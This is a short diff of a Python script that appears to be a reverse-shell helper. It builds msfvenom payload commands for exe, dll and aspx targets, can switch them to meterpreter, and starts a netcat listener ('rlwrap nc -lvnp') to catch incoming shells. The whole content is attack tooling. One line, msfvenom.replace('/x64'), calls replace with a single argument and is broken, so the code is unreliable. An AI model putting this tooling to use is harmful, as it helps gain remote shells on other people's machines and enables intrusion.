@@ -69,7 +69,7 @@ def Get_IP(NT = args.interface):
         return IP
 
 def nc_list():
-    if payload == 'exe' or payload == '.exe' or payload == 'dll' or payload == '.dll':
+    if payload == 'exe' or payload == 'dll' or payload == 'aspx':
         os.system('rlwrap nc -lvnp ' + str(port))
     else:
         os.system('nc -lvnp ' + str(port))
@@ -112,7 +112,7 @@ def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
 
     if msf == True:
         msfvenom = msfvenom.replace('shell_', 'meterpreter/')
-    if (arch == 'x86' or arch == '86') and (payload == '.exe' or payload == 'exe' or payload == '.dll' or payload == 'dll'):
+    if (arch == 'x86' or arch == '86') and (payload == 'exe' or payload == 'dll'):
         msfvenom = msfvenom.replace('/x64')
     elif arch == 'x86' or arch == '86':
         msfvenom = msfvenom.replace('x64', 'x86')
